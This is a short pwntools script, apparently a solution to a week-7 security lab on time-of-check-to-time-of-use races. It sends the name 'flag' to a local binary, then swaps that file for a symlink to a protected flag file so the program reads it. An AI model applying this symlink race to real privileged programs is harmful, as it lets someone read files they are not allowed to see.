#!/usr/bin/env python

from pwn import *
from os import path

p = process('./tocttou')

# open("flag", "a").close()

p.sendline("flag")

os.remove("flag")
os.symlink("/home/labs/week7/7-tocttou/flag", "flag");

p.interactive()
